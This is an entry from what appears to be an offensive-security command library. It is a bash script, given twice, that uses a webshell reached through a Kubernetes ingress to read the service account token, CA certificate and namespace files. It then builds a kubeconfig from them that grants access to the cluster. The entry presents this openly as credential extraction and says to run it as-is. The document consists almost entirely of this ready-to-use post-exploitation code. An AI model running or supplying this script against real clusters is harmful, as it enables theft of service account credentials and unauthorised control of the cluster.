---
data: >-
  #!/bin/bash

  server=https://127.0.0.1:36923

  ingress=http://localhost

  ca=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=base64
  /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0")

  token=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat
  /var/run/secrets/kubernetes.io/serviceaccount/token")

  namespace=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat
  /var/run/secrets/kubernetes.io/serviceaccount/namespace")

  cat> ingress.kubeconfig <<EOF

  apiVersion: v1

  kind: Config

  clusters:

  - name: default-cluster
    cluster:
     certificate-authority-data: ${ca}
     server: ${server}
  contexts:

  - name: default-context
    context:
     cluster: default-cluster
     namespace: default
     user: default-user
  current-context: default-context

  users:

  - name: default-user
    user:
     token: ${token}
  EOF
tags:
  - kubeconfig
  - generation
type: command
output: ingress.kubeconfig file created
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.867Z'
id: 3199af13-f855-4ab5-8b3a-4be174079a3e
verified: false
validated: true
submitted: true
---
# bash-generate-ingress-kubeconfig

## Command

```bash
#!/bin/bash
server=https://127.0.0.1:36923
ingress=http://localhost
ca=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=base64 /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -w 0")
token=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")
namespace=$(curl -s -H "host: x.x" $ingress/z/ -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
cat> ingress.kubeconfig <<EOF
apiVersion: v1
kind: Config
clusters:
- name: default-cluster
  cluster:
   certificate-authority-data: ${ca}
   server: ${server}
contexts:
- name: default-context
  context:
   cluster: default-cluster
   namespace: default
   user: default-user
current-context: default-context
users:
- name: default-user
  user:
   token: ${token}
EOF
```

## Description

Bash script to extract SA creds via webshell and generate a kubeconfig file for cluster access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `server` | Kubernetes API server URL | Yes |
| `ingress` | Ingress endpoint URL | Yes |

## Examples

### Basic Usage

Run the script as-is.

## Expected Output

File ingress.kubeconfig with valid config.

## Related

- [[procedures/Extract-Service-Account-Tokens-and-Generate-Kubeconfig]]
